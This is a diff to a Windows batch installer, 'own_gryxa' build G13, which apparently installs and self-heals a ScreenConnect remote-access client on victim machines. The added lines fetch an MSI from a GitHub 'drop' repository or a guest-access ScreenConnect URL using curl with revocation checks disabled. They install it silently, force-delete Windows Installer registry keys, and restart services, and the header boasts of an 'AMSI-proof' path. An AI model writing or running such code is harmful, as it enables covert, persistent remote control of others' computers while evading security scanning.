@@ -1,6 +1,7 @@
 @echo off
-rem OWN_GRYXA BUILD 20260804G12 - PowerShell-free Gryxa install (AMSI-proof fallback)
-rem G12: HEAL 1060 wipe orphan FP dir + force re-fetch MSI before /x+/i (330MLRACE: /i exit0 still 1060).
+rem OWN_GRYXA BUILD 20260804G13 - PowerShell-free Gryxa install (AMSI-proof fallback)
+rem G13: HEAL purge phantom Installer Products packed-GUID (L34) before fresh /i; also try ui.gryxa.com MSI.
+rem G12: HEAL 1060 wipe orphan FP dir + force re-fetch MSI before /x+/i.
 rem G11: HEAL 1060: /i then /fa; /x+/i ONLY when no live gryxa.com relay.
 rem G10: NEVER msiexec /x ProductCode on REINSTALL path (shared GUID killed other Gryxa FPs).
 rem G9: HEAL never msiexec /x (start-only or /i-if-1060). REINSTALL aborts if any gryxa.com relay RUNNING.
@@ -26,14 +27,16 @@ set "MSI=%STAGE%\pkg_gryxa.msi"
 set "LOG=%WD%\own_gryxa.log"
 set "LOCK=%WD%\gryxa_msi.lock"
 set "URL1=https://raw.githubusercontent.com/xnobuddy/github-drop/main/pkg_gryxa.msi"
+set "URL2=https://ui.gryxa.com/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest"
 set "SVC=ScreenConnect Client (%GRYXA_FP%)"
 set "PC={9D7CC418-A356-9693-DCC5-41EC44D03B31}"
+set "PCPACKED=814CC7D9653A3969CD5C14CE440DB313"
 set "DIR86=%ProgramFiles(x86)%\ScreenConnect Client (%GRYXA_FP%)"
 set "DIR64=%ProgramFiles%\ScreenConnect Client (%GRYXA_FP%)"
 
 if not exist "%WD%" mkdir "%WD%" >nul 2>&1
 if not exist "%STAGE%" mkdir "%STAGE%" >nul 2>&1
-echo [%DATE% %TIME%] own_gryxa G12 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
+echo [%DATE% %TIME%] own_gryxa G13 begin fp=%GRYXA_FP% reinstall=%REINSTALL% mode=%MODE%>>"%LOG%"
 
 rem G10: OBSERVE blocks REINSTALL/mutate-/x only — still allow HEAL start + 1060 /i
 if exist "%WD%\observe.flag" (
@@ -256,12 +259,13 @@ sc start "%SVC%" >nul 2>&1
 timeout /t 12 /nobreak >nul
 call :FindLiveRelay
 if defined LIVE_FP goto :DoHealOk
-rem last resort: /x + wipe orphan FP dir + fresh MSI /i — ONLY when no live gryxa.com relay
+rem last resort: /x + purge phantom Installer reg + wipe orphan FP dir + fresh MSI /i
 call :FindLiveRelay
 if defined LIVE_FP goto :DoHealOk
-echo [%DATE% %TIME%] heal_1060_x_wipe_then_i_no_live_relay>>"%LOG%"
+echo [%DATE% %TIME%] heal_1060_x_purge_wipe_i_no_live_relay>>"%LOG%"
 msiexec /x %PC% /qn /norestart REBOOT=ReallySuppress >>"%LOG%" 2>&1
 timeout /t 5 /nobreak >nul
+call :PurgePhantomPc
 sc stop "%SVC%" >nul 2>&1
 sc delete "%SVC%" >nul 2>&1
 if exist "%DIR86%" (
@@ -287,8 +291,18 @@ echo [%DATE% %TIME%] heal_1060_ok fp=!LIVE_FP!>>"%LOG%"
   echo CURRENT_FP=!LIVE_FP!
   echo RELAY=update.gryxa.com
   echo UI=ui.gryxa.com
-  echo UPDATED=cmd-own_gryxa-G12-heal-i
+  echo UPDATED=cmd-own_gryxa-G13-heal-i
 ) >"%WD%\gryxa.cfg"
+exit /b 0
+
+:PurgePhantomPc
+rem L34-equivalent: packed ProductCode under Installer Products (phantom Installed=00:00:00)
+echo [%DATE% %TIME%] purge_phantom_pc packed=%PCPACKED%>>"%LOG%"
+reg delete "HKLM\SOFTWARE\Classes\Installer\Products\%PCPACKED%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\%PCPACKED%" /f >nul 2>&1
+reg delete "HKCR\Installer\Products\%PCPACKED%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
+reg delete "HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\%PC%" /f >nul 2>&1
 exit /b 0
 
 :FetchMsi
@@ -297,6 +311,11 @@ if exist "%MSI%" for %%F in ("%MSI%") do if %%~zF GTR 1000000 set "NEED=0"
 if "%NEED%"=="1" (
   echo [%DATE% %TIME%] fetch %URL1%>>"%LOG%"
   "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL1%" >>"%LOG%" 2>&1
+  if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
+)
+if not exist "%MSI%" (
+  echo [%DATE% %TIME%] fetch_fallback %URL2%>>"%LOG%"
+  "%CURL%" -L --ssl-no-revoke --connect-timeout 20 --max-time 180 -o "%MSI%.tmp" "%URL2%" >>"%LOG%" 2>&1
   if exist "%MSI%.tmp" for %%F in ("%MSI%.tmp") do if %%~zF GTR 1000000 move /y "%MSI%.tmp" "%MSI%" >nul 2>&1
 )
 if not exist "%MSI%" (
